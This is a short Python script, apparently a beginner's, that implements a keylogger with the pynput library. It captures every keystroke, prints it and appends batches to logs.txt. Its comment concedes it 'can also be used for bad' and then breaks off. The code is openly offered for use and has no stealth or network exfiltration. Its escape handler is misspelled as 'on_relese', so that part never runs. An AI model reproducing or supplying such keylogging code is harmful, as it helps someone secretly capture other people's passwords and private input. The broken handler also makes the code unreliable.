#This is a basic key logger, If you don't know what this is. It will keep track of every keyboard input by the computer
#This can be helpful for a number of reason but can also be used for bad. for example, you can

import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(Key):
    global keys, count
    keys.append(Key)
    count += 1
    print("{} Pressed".format(Key))

    if count >= 10: 
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("logs.txt", "a") as logs:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                logs.write("\n")
            elif k.find("key") == -1:
                logs.write(k)
            

def on_relese(Key):
    if Key == Key.esc:
        return False

with Listener(on_press=on_press, on_relese=on_relese) as listner:
    listner.join()
